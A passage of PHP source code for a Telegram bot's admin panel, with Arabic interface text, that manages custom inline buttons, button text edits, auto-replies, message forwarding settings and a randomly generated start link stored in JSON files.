    $key['inline_keyboard'][]=[['text'=>"شحن $name3mla 💰",'callback_data'=>"llkn"],['text'=>"الشروط 📜",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"عدد الطلبات : $bot_tlb ✅",'callback_data'=>"llkn"]];
    $addedIds = [];

    foreach ($zr['id'] as $i) {
        $name = $zr['infonam'][$i];
        $biozr = $zr['infodesc'][$i];

        if (preg_match("#http#", $biozr)) {
            $editButton = ['text' => "$name", 'callback_data' => "edit:$i"];
            $deleteButton = ['text' => "🗑️", 'callback_data' => "del:$i"];

            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [$editButton, $deleteButton];
                $addedIds[] = $i;
            }
        } else {
            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [['text' => "$name", 'callback_data' => "edit:$i"]];
                $addedIds[] = $i;
            }
        }
    }

    $key['inline_keyboard'][] = [['text' => "+", 'callback_data' => "newzr"]];
     $key['inline_keyboard'][] =  [['text' => "تعديل ألأزرار", 'callback_data' => "azrarsb"],['text' => "الأزرار ألاساسيه : ".$izr_sock['mode']."", 'callback_data' => "izr_sock_mode"]];
    $key['inline_keyboard'][] = [['text' => 'رجوع', 'callback_data' => "paneel"]];

    bot('editmessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*• مرحبا بك في قسم الازرار الشفافة ✨*

- يمكنك اضافه ازرار شفافة او حذفها ( لا يمكنك حذف الازرار الاساسية ولاكن يمكنك تعديلها من قسم تعديل الازرار )",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup' => json_encode(['inline_keyboard' => $key['inline_keyboard']])
    ]);

    $zr['modemr'] = null;
    $zr['mode'] = null;
    $zr = json_encode($zr, true);
    file_put_contents("FCZR/" . X_ . "/zr.json", $zr);
}




    if($text == "admin" ){
    $key=[];
    foreach ($zr['id'] as $i){
    
     
        $biozr = $zr['infodesc'][$i];
    $name = $zr['infonam'][$i];
    if(preg_match("#http#",$biozr)) {
    	
    $key[inline_keyboard][]=[[text=>"$name",url=>"edit:$i" ], [text=>"🗑️",callback_data=>"del:$i" ]] ;
   } else {
   	
   $key[inline_keyboard][]=[[text=>"$name",callback_data=>"edit:$i" ]];
  } 
}

$key[inline_keyboard][]=[[text=>"+",callback_data=>"newzr"]];
$key['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"paneel"]];
bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
        'text' => "*• مرحبا بك في قسم الازرار الشفافة ✨*

- يمكنك اضافه ازرار شفافة او حذفها ( لا يمكنك حذف الازرار الاساسية ولاكن يمكنك تعديلها من قسم تعديل الازرار )",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup'=>json_encode($key)
    ]);
    unset($zr['mode']);
    
    $zr = json_encode($zr,true);
    file_put_contents("FCZR/". X_. "/zr.json",$zr);
    }

        
    $rr = explode(':',$data);
    if($rr[0] == 'del_g'){
        $bas = $rr[1];
        unset($zr['editsd'][$bas]);
        unset($zr['orignal'][$bas]);
        unset($zr['id_edits'][$bas]);
        $zr['modemr'] = null;
        $zr['mode'] = null;

        $zr = json_encode($zr, true);
        file_put_contents("FCZR/" . X_ . "/zr.json", $zr);

          $key = [];
    $addedIds = []; // Initialize addedIds array

    $zr = json_decode(file_get_contents("FCZR/" . X_ . "/zr.json"),1);
    foreach (json_decode(file_get_contents("FCZR/" . X_ . "/zr.json"),1)['id_edits'] as $i) {
        $name = $zr['orignal'][$i];

        // Replace 'true' with your actual condition
        if ($name) {
            $editButton = ['text' => "$name", 'callback_data' => "edi_g:$i"];
            $deleteButton = ['text' => "🗑️", 'callback_data' => "del_g:$i"];

            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [$editButton, $deleteButton];
                $addedIds[] = $i;
            }
        } else {
            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [['text' => "$name", 'callback_data' => "edit:$i"]];
                $addedIds[] = $i;
            }
        }
    }

    $key['inline_keyboard'][] = [['text' => "تعديل زر جديد", 'callback_data' => "newzredit"]];
    $key['inline_keyboard'][] = [['text' => "قسم ألأزرار الشفافه", 'callback_data' => "azrars"]];
    $key['inline_keyboard'][] = [['text' => 'رجوع', 'callback_data' => "paneel"]];

    // Assuming that you have a function named 'bot' for sending messages
    bot('editmessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*
        • مرحبا بك في قسم تعديل ازرار البوت 👋🏼

        - يمكنك اضافه تعديلات للازرار وحذفها 
        - اضغط على نص الزر لعرض التعديل الذي اصبح عليه الزر .
        *
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => true,
        'disable_notification' => false,
        'reply_markup' => json_encode(['inline_keyboard' => $key['inline_keyboard']])
    ]);

    }
    
if ($data == "azrarsb" or $data == "soon_") {
    $key = [];
    $addedIds = []; // Initialize addedIds array

    foreach ($zr['id_edits'] as $i) {
        $name = $zr['orignal'][$i];

        // Replace 'true' with your actual condition
        if ($name) {
            $editButton = ['text' => "$name", 'callback_data' => "edi_g:$i"];
            $deleteButton = ['text' => "🗑️", 'callback_data' => "del_g:$i"];

            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [$editButton, $deleteButton];
                $addedIds[] = $i;
            }
        } else {
            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [['text' => "$name", 'callback_data' => "edit:$i"]];
                $addedIds[] = $i;
            }
        }
    }

    $key['inline_keyboard'][] = [['text' => "تعديل زر جديد", 'callback_data' => "newzredit"]];
    $key['inline_keyboard'][] = [['text' => "قسم ألأزرار الشفافه", 'callback_data' => "azrars"]];
    $key['inline_keyboard'][] = [['text' => 'رجوع', 'callback_data' => "paneel"]];

    // Assuming that you have a function named 'bot' for sending messages
    bot('editmessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*
        • مرحبا بك في قسم تعديل ازرار البوت 👋🏼

        - يمكنك اضافه تعديلات للازرار وحذفها 
        - اضغط على نص الزر لعرض التعديل الذي اصبح عليه الزر .
        *
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => true,
        'disable_notification' => false,
        'reply_markup' => json_encode(['inline_keyboard' => $key['inline_keyboard']])
    ]);

    $zr['modemr'] = null;
    $zr['mode'] = null;
    $zr = json_encode($zr, true);
    file_put_contents("FCZR/" . X_ . "/zr.json", $zr);

    unset($modes[$from_id]);
    file_put_contents("$mode_name", json_encode($modes));
    die();
}

if ($data == 'newzredit') {
    bot('editmessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*
        • ارسل الان اسم الزر المراد تعديله
        - عليك كتابه اسم الزر بشكل صحيح ...!
        *
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => "soon_"]],
            ]
        ])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name", json_encode($modes));
    die();
}

if ($text and $modes[$from_id] == 'newzredit') {
    bot('SendMessage', [
        'chat_id' => $chat_id,
        'text' => "*
        • ارسل الان النص الذي تريد كتابته بدل *'" . $text . "' .
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => "soon_"]],
            ]
        ])
    ]);
    $modes['helper'][$from_id] = $text;
    $modes[$from_id] = "axs2";
    file_put_contents("$mode_name", json_encode($modes));
    die();
}

if ($text and $modes[$from_id] == 'axs2') {
    bot('SendMessage', [
        'chat_id' => $chat_id,
        'text' => "*
        • تم الحفظ .
        *
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => "soon_"]],
            ]
        ])
    ]);

    $hardId = uniqid();

    $zr['id_edits'][] = $hardId;
    $zr['editsd'][$hardId] = $text;
    $zr['orignal'][$hardId] = $modes['helper'][$from_id];
    $zr = json_encode($zr, true);
    file_put_contents("FCZR/" . X_ . "/zr.json", $zr);

    unset($modes['helper'][$from_id]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name", json_encode($modes));
    die();
}

    

    
    if($data == "newzr"){
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"• ارسل اسم الزر الراد اضافته",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($k)
	]);
	$zr['mode'] = "newzr";
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	
	if($text and $zr['mode'] == "newzr"){
	bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "*
        • ارسل الان المحتوى المراد اضافته الى الزر 
*
- يمكنك ارسال كليشة نصية (يمكنك استخدام الماركداون)
- يمكنك ارسال رابط مباشر يبدء (https://....) لكي يصبح الزر يحتوي على رابط


        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup'=>json_encode($k)
    ]);
bot('sendMessage', [
    'chat_id' => $chat_id,
    'text' => "
• يمكنك استخدام الازرار الاساسية في عمل الزر الجديد 

- لكي تحصل على كود الازرار ارسل '`مشاهدة الازرار`' بالرد على اي كليشة تحتوي على ازرار
    ",
    'parse_mode' => "MARKDOWN",
    'disable_web_page_preview' => "true",
    'disable_notification' => false,
    'reply_markup'=>json_encode($k)
]);
    $zr['mode'] = "add2";
    $zr['namezr'] = $text;
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
    }
    
    
    if($text and $zr['mode'] == "add2"){
    	if(preg_match("/bero:/",$text)){
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "*
        • تم حفظ الزر (زر مختصر)
        
        - مسار الزر : home
        *
                ",
                'parse_mode' => "MARKDOWN",
                'disable_web_page_preview' => "true",
                'disable_notification' => false,
                'reply_markup'=>json_encode($k)
            ]);
            $rr = explode("bero:",$text)[1];
            $rr = base64_decode($rr);
            $zr['id'][] = $rr; 
            $zr['is_i'][$rr] = true; 
            $zr['infonam'][$rr] = $zr['namezr'];
            $zr['infodesc'][$rr] = $text;
            $zr['infosect'][$rr] = "edit";
            
            $zr['mode'] = null;
            $zr['namezr'] = null;
            
        $zr = json_encode($zr,true);
        file_put_contents("FCZR/". X_. "/zr.json",$zr);
            die();
        }
	bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "*
• تم حفظ الزر (محتوى نصي)

- مسار الزر : home
*
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup'=>json_encode($k)
    ]);
    $zr['id'][] = $rr; 
    $zr['infonam'][$rr] = $zr['namezr'];
    $zr['infodesc'][$rr] = $text;
    $zr['infosect'][$rr] = "edit";
    
    $zr['mode'] = null;
    $zr['namezr'] = null;
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
    }
    
    $u = explode(":",$data);
	if(explode(":",$data)[0] == "del"){
    if($zr['infonam'][explode(":",$data)[1]]){
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- تم مسح الزر
",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($k)
	]);
	$zr['infonam'][$u[1]] = null;
    $zr['infodesc'][$u[1]] = null;
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	}
	
	if(explode(":",$data)[0] == "edit"){
    if($zr['infonam'][explode(":",$data)[1]]){
    	$id = explode(":",$data)[1];
    
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    
    if($zr['infosect'][explode(":",$data)[1]] == "edit"){
    	$sect = "تعديل رساله";
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "send"){
    	$sect = "تعديل رساله";
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "hmsa"){
    	$sect = "همسة";
    }
    
    if(preg_match("#http#",$biozr)) {
    	$tp = "رابط ( $biozr) " ;
   } elseif(preg_match("/bero:/",$text)){
    $tp = "زر مختصر";
}else {
   	$tp = "محتوى نصي" ;
  } 
  $h[inline_keyboard][]=[[text=>"• تعديل محتوي الزر •",callback_data=>"setmhtea:$id"]];
    $h[inline_keyboard][]=[[text=>"• طريقه عرض الرساله : $sect •",callback_data=>"sect:$id"]];
    	$h[inline_keyboard][]=[[text=>"• مسح الزر •",callback_data=>"del:$id"]];
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- مسار الزر : home

- نوع الزر : $tp


`$biozr`

",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	
	}
	}
	
	if(explode(":",$data)[0] == "sect"){
    if($zr['infonam'][explode(":",$data)[1]]){
    	
    if($zr['infosect'][explode(":",$data)[1]] == "edit"){
    	$sect = "تعديل رساله";
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "send"){
    	$sect = "تعديل رساله";
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "hmsa"){
    	$sect = "همسة";
    }
    	$id = explode(":",$data)[1];
    $h[inline_keyboard][]=[[text=>"• تعديل محتوي الزر •",callback_data=>"setmhtea:$id"]];
    $h[inline_keyboard][]=[[text=>"• تعديل رسالة •",callback_data=>"editss:$id"]];
    	$h[inline_keyboard][]=[[text=>"• رساله جديده •",callback_data=>"sendss:$id"]];
    $h[inline_keyboard][]=[[text=>"• همسة •",callback_data=>"hmsass:$id"]];
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- مسار الزر : home

- طريقه عرض الزر : $sect

اختر من الازرار لتغيي نوع العرض

",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	
	$zr['modemr']= null ;
	$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	}
	
	
	
	if(explode(":",$data)[0] == "editss"){
		
    	$id = explode(":",$data)[1];
    $h[inline_keyboard][]=[[text=>"• تعديل محتوي الزر •",callback_data=>"setmhtea:$id"]];
    $h[inline_keyboard][]=[[text=>"• تعديل رسالة •",callback_data=>"editss:$id"]];
    	$h[inline_keyboard][]=[[text=>"• رساله جديده •",callback_data=>"sendss:$id"]];
    $h[inline_keyboard][]=[[text=>"• همسة •",callback_data=>"hmsass:$id"]];
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- مسار الزر : home

- طريقه عرض الزر : تعديل رساله

اختر من الازرار لتغيي نوع العرض

",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	$zr['infosect'][$id] = "edit";
	$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	
	if(explode(":",$data)[0] == "setmhtea"){
		
    	$id = explode(":",$data)[1];
   
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"edit:$id"]];
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    $htwa = $zr['infodesc'][$id] ;
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- محتوي الداخل الزر :
$htwa

- ارسل الان المحتوي الجديد داخل الزر
",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	$zr['modemr']= "setmhtea";
	$zr['idzr']= "$id";
	$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	
	if($text and $zr['modemr']== "setmhtea") {
		$id = $zr['idzr'] ;
		bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "*
• تم حفظ محتوي الزر ✅

- مسار الزر : home
*
        ",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup'=>json_encode($k)
    ]);
    $zr['infodesc'][$id] = $text;
    $zr['idzr'] = null ;
    $zr['modemr']= null ;
    $zr['mode']= null ;
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
		} 
	
	if(explode(":",$data)[0] == "sendss"){
		
    	$id = explode(":",$data)[1];
    $h[inline_keyboard][]=[[text=>"• تعديل محتوي الزر •",callback_data=>"setmhtea:$id"]];
    $h[inline_keyboard][]=[[text=>"• تعديل رسالة •",callback_data=>"editss:$id"]];
    	$h[inline_keyboard][]=[[text=>"• رساله جديده •",callback_data=>"sendss:$id"]];
    $h[inline_keyboard][]=[[text=>"• همسة •",callback_data=>"hmsass:$id"]];
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- مسار الزر : home

- طريقه عرض الزر : رساله جديده

اختر من الازرار لتغيي نوع العرض

",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	$zr['infosect'][$id] = "send";
	$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
	
	if(explode(":",$data)[0] == "hmsass"){
		
    	$id = explode(":",$data)[1];
    $h[inline_keyboard][]=[[text=>"• تعديل محتوي الزر •",callback_data=>"setmhtea:$id"]];
    $h[inline_keyboard][]=[[text=>"• تعديل رسالة •",callback_data=>"editss:$id"]];
    	$h[inline_keyboard][]=[[text=>"• رساله جديده •",callback_data=>"sendss:$id"]];
    $h[inline_keyboard][]=[[text=>"• همسة •",callback_data=>"hmsass:$id"]];
    $h[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
    $namezr = $zr['infonam'][explode(":",$data)[1]];
    
    $biozr = $zr['infodesc'][explode(":",$data)[1]];
    bot('editmessagetext',[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>"
• اسم الزر : *$namezr*

- مسار الزر : home

- طريقه عرض الزر : همسة

اختر من الازرار لتغيي نوع العرض

",
    'parse_mode'=>"MARKDOWN",
    'reply_markup'=>json_encode($h)
	]);
	$zr['infosect'][$id] = "hmsa";
	$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
	}
    
    
	

if($data == "frdrs"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم توجيه جميع الرسائل التي يتم ارسالها الى البوت 🚸

- يمكنك (تفعيل-تعطيل) توجيه الرسائل من المستخدمين 
- يمكنك (تفعيل-تعطيل) خاصيه مسح الرد الذي قام بالرد به البوت وابقاء الرد الخاص بك 
- يمكنك (تفعيل-تعطيل) شمول بقيه الادمنية بتوجيه الرسائل لهم
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'توجيه الرسائل : ' . $fords['del'],'callback_data'=>"fords_del"],['text'=>'مسح الرد تلقائيا : '. $fords['autodel'] ,'callback_data'=>"fords_autodel"]],
        [['text'=>'توجيه الرسائل الي بقيه المطورين : ' . $fords['toother'],'callback_data'=>"fords_toother"]],
        [['text'=>'رد علي الرسائل : ' . $fords['reply'],'callback_data'=>"fords_reply"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
}

if($data == "setstop"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
[
• ارسل الرساله التي سوف تضهر عند ايقاف البوت .

- يمكنك وضع بعض الاضافات الى الرساله من خلال استخدام الاهاشتاكات التاليه :
        
1. #name_user : لوضع اسم شخص ووضع معرفه داخل اسمه 
2. #username : لوضع اسم مستخدم الشخص مع اضافه @ 
3. #name : لوضع اسم الشخص
4. #id : لوضع ايدي الشخص
        ]
يمكنك تعين نص ماركداون في البوت , عند كتابه معرف قناتك او معرفك قم بوضع [] بين المعرف .

    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"botstat"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($text and $modes[$from_id] == "setstop"){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
        • مثال على الرساله : 

        $text
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    ]);
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
        • تم الحفظ بنجاح
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        'reply_markup'=>json_encode([ 
            'inline_keyboard'=>[
                [['text'=>'رجوع','callback_data'=>"botstat"]],
            ]
            ])
    ]);
    $bot_enter["stoper"] = $text;
    file_put_contents("$ent_name",json_encode($bot_enter));
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}

if($data == "botstat"){

    if($bot_enter["link"] == null){
$length = 40;
$cod_star = bin2hex(random_bytes($length / 2));
$bot_enter["link"] = $cod_star;
file_put_contents("$ent_name",json_encode($bot_enter));
    }else{
        $cod_star = $bot_enter["link"];
    }

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم عمل البوت 🥷🏾

- رابط الدخول الى البوت : 
[https://t.me/". X_ ."?start=$cod_star]
        
- يمكنك استخدام رابط الدخول الى البوت عند ايقاف عمل البوت
        
• عدد الاعضاء الكلي الذين دخلوا لرابط الدخول الى البوت : $count_eners
• عدد الضغطات للرابط : *". $count_ecw ."*
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'حاله عمل البوت : '. $bot_enter['bot'],'callback_data'=>"enters_bot"]],
            [['text'=>'تعيين رساله التي تضهر عند ايقاف البوت','callback_data'=>"setstop"]],
            [['text'=>'تغير رابط الدخول للبوت','callback_data'=>"change_url"]],
            [['text'=>'مسح جميع الاعضاء الي دخلوا لرابط الدخول','callback_data'=>"deltene"]],
            [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
    ]);
}

if($data  == "deltene"){
    $code = $bot_enter["link"];
    bot('answerCallbackQuery',[ 
        'callback_query_id'=>$update->callback_query->id, 
        'text'=>"
        • تم مسح الاعضاء الي دخلو لرابط الدخول 
", 
        'show_alert'=>false
        ]); 
        unset($enters["mems"][$code]);
        file_put_contents("$entars_name",json_encode($enters));
        bot("editmessagetext",[
            'chat_id' => $chat_id,
            "message_id"=>$message_id,
            'text' => "
• مرحبا بك في قسم عمل البوت 🥷🏾
    
- رابط الدخول الى البوت : 
[https://t.me/". X_ ."?start=$code]
            
- يمكنك استخدام رابط الدخول الى البوت عند ايقاف عمل البوت
            
• عدد الاعضاء الكلي الذين دخلوا لرابط الدخول الى البوت : *0*
• عدد الضغطات للرابط : *". $count_ecw ."*
            ",
            'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
            
        'reply_markup'=>json_encode([ 
            'inline_keyboard'=>[
                [['text'=>'حاله عمل البوت : '. $bot_enter['bot'],'callback_data'=>"enters_bot"]],
                [['text'=>'تعيين رساله التي تضهر عند ايقاف البوت','callback_data'=>"setstop"]],
                [['text'=>'تغير رابط الدخول للبوت','callback_data'=>"change_url"]],
                [['text'=>'مسح جميع الاعضاء الي دخلوا لرابط الدخول','callback_data'=>"deltene"]],
                [['text'=>'رجوع','callback_data'=>"paneel"]],
            ]
            ])
        ]);
}

if($data == 'change_url'){
    bot('answerCallbackQuery',[ 
        'callback_query_id'=>$update->callback_query->id, 
        'text'=>"
        • تم تغيير رابط الدخول
", 
        'show_alert'=>false
        ]); 
        $length = 40;
        $cod_star = bin2hex(random_bytes($length / 2));
        $bot_enter["link"] = $cod_star;
        file_put_contents("$ent_name",json_encode($bot_enter));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم عمل البوت 🥷🏾

- رابط الدخول الى البوت : 
[https://t.me/". X_ ."?start=$cod_star]
        
- يمكنك استخدام رابط الدخول الى البوت عند ايقاف عمل البوت
        
• عدد الاعضاء الكلي الذين دخلوا لرابط الدخول الى البوت : $count_eners
• عدد الضغطات للرابط : *". $count_ecw ."*
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'حاله عمل البوت : '. $bot_enter['bot'],'callback_data'=>"enters_bot"]],
            [['text'=>'تعيين رساله التي تضهر عند ايقاف البوت','callback_data'=>"setstop"]],
            [['text'=>'تغير رابط الدخول للبوت','callback_data'=>"change_url"]],
            [['text'=>'مسح جميع الاعضاء الي دخلوا لرابط الدخول','callback_data'=>"deltene"]],
            [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
    ]);
}

$task_ex = explode("enters_",$data)[1];
if($task_ex){

    if($bot_enter["link"] == null){
        $length = 40;
        $cod_star = bin2hex(random_bytes($length / 2));
        $bot_enter["link"] = $cod_star;
        file_put_contents("$ent_name",json_encode($bot_enter));
            }else{
                $cod_star = $bot_enter["link"];
            }

    $Y = $bot_enter[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $bot_enter[$task_ex] = $t;
    file_put_contents("$ent_name",json_encode($bot_enter));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم عمل البوت 🥷🏾

- رابط الدخول الى البوت : 
[https://t.me/". X_ ."?start=$cod_star]
        
- يمكنك استخدام رابط الدخول الى البوت عند ايقاف عمل البوت
        
• عدد الاعضاء الكلي الذين دخلوا لرابط الدخول الى البوت : $count_eners
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'حاله عمل البوت : '. $bot_enter['bot'],'callback_data'=>"enters_bot"]],
            [['text'=>'تعيين رساله التي تضهر عند ايقاف البوت','callback_data'=>"setstop"]],
            [['text'=>'تغير رابط الدخول للبوت','callback_data'=>"change_url"]],
            [['text'=>'مسح جميع الاعضاء الي دخلوا لرابط الدخول','callback_data'=>"deltene"]],
            [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
    ]);
}


$task_ex = explode("rdod_",$data)[1];
if($task_ex){
    $Y = $rdod[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $rdod[$task_ex] = $t;
    file_put_contents("$rdod_name",json_encode($rdod));
    $Ks = ['inline_keyboard' => []];
    foreach($rdod['msg'] as $d){
        $co = array_search($d,$rdod['msg']);

    $Ks['inline_keyboard'][] =  [['text'=>"$d",'callback_data'=>"inford_$co"],['text'=>'🗑','callback_data'=>"delrd_$co"]];
    }
    $Ks['inline_keyboard'][] =  [['text'=>'اضافه رد جديد','callback_data'=>"addrd"],['text'=>'الردود : '. $rdod['stat'],'callback_data'=>"rdod_stat"]];
    $Ks['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"paneel"]];
    

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الردود 👮‍♀️

- يمكنك اضافه ردود وحذفها 
- يمكنك استخدام الاوامر (اضف رد-مسح رد) 
        
- اضغط على نص الزر لعرض محتواه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Ks)
    ]);
}

